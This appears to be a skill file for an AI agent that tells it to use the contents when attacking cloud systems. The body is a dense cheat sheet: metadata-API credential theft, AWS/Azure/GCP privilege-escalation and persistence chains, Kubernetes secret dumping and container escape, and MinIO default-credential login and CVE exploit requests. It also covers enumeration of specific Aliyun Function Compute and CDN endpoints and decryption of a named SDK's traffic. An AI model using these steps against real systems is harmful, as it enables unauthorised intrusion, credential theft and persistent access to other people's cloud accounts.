---
name: cloud-attack-methods
description: >-
  Cloud attacks: metadata API, S3/K8s, AWS/Azure/GCP identity escalation, MinIO attack matrix, Aliyun FC, ChengZi SDK decryption. Use when attacking cloud metadata, IAM, K8s, MinIO, Aliyun FC, or cloud post-ex.
metadata:
  tags: [penetration-testing, red-team]
---

## Cloud Attack Methods

```
=== Cloud ===
Metadata API: AWS 169.254.169.254/latest/meta-data/iam/ | Azure -H Metadata:true | GCP metadata.google.internal | Aliyun 100.100.100.200
Object storage: aws s3 ls --no-sign-request | K8s: /var/run/secrets/.../token → api/v1 get secrets/exec pods → cluster-admin
🚨Cloud identity attacks (privilege escalation and lateral movement after obtaining key/token):
  AWS: enumerate-iam/cloudfox/ScoutSuite to enumerate permissions → pacu auto-finds privesc paths (iam:PassRole + lambda/ec2/glue, 18+ chains) | STS AssumeRole cross-account | Lambda environment variables steal keys
  Azure/Entra: roadtools (roadrecon dump tenant) / AADInternals | Device code / refresh token | Managed Identity IMDS steal token | Automation Runbook RCE | Key Vault read secrets
  Entra post-exploitation: GraphRunner (Graph API enumerate / search emails / backdoor App) | add service principal credentials (stealthy persistence) | dynamic group abuse | PRT theft lateral movement
  GCP: service account token (metadata) | serviceAccountTokenCreator / actAs privilege escalation | gcloud enumeration
🚨K8s deep exploitation (after gaining cluster network / pod access): kubelet 10250 unauthorized (/pods enumerate, /exec enter any container) | etcd 2379 no-auth reads all secrets | API server anonymous | RBAC over-privileged SA (kubectl auth can-i --list) | privileged pod mounting host for escape | cloud K8s hijack node identity → IMDS
🚨MinIO attack matrix:
  Fingerprint: Server: MinIO | /minio/health/live → 200 (empty body) | /minio/health/cluster → 200 | 9000 (API) + 9001 (Console)
  Console brute-force: POST http://IP:9001/api/v1/login body={"accessKey":"minioadmin","secretKey":"minioadmin"} | 403 = "invalid Login"
  STS API: POST /?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&WebIdentityToken=JWT → requires JWT provider configuration
  CVE-2023-28432: POST /minio/health/cluster?verify (info leak, returns environment variables including MINIO_SECRET_KEY)
  CVE-2023-28434: path traversal /bucket/..%2F..%2Fetc/passwd → XMinioInvalidResourceName (patched = unavailable)
  Anonymous access: GET /bucket-name/ → ListBucket (200) = anonymous read | PUT /bucket/file → AccessDenied (403) = anonymous write disabled
  Upload bypass: application-layer sign validation checks dir parameter but does not validate it → can write to arbitrary bucket (sign only validates cid+et+og, not dir)
  Extension bypass: .jsp;.jpg / .jsp%00.jpg bypasses application blacklist but MinIO stores as static file (image/jpeg) and does not execute
🚨Aliyun FC functions (fcapp.run) enumeration:
  Identify: URL contains *.cn-{region}.fcapp.run → Aliyun Function Compute (Serverless)
  Characteristics: POST returns "unauthorized method 'POST'" (405) = GET only | 200+{"code":200,"msg":"Forbidden"} = path exists but missing parameters
  Exploitation: GET /{path}/{id}.html → 302 redirect leaks real CDN domain + auth_key signed URL (exposes CDN domain / bucket structure / signing algorithm)
  Enumeration: different path prefixes correspond to different APPs (/mkzavakx/ vs /kpqwbcoq/) | invalid ID → 302 to qzone.qq.com/404.html (fallback)
  Path traversal: FC normalizes correctly (../ is ineffective), but can enumerate different function paths
  CDN auth_key (Kunlun CDN kunlunaq.com): format=timestamp-rand-uid-md5(uri-timestamp-rand-uid-privatekey) → cracking requires privatekey | x-tengine-error exposes "denied by req auth"
  FC→CDN chain: FC function generates signed URL → kunlun/kijwsks.com CDN download | Referer spoofing with Baidu (mo.baidu.com)
🚨ChengZi SDK decryption:
  Initialization: POST https://random.d3504.cn/init3 body={appkey,channelCode,...} → encrypted response (base64)
  Decryption: single-byte XOR key=0x96 → JSON (channelCode / fu=download URL / csu=tracking URL / ph=package hash)
  d3504.cn protected by Cloudflare + Aliyun DDoS protection (aliyunddos) + Kunlun CDN (kunlunaq.com) → multi-layer protection
  Key: fu field = real APK download FC function URL (may be different region from landing page!) | csu = click tracking callback URL
```
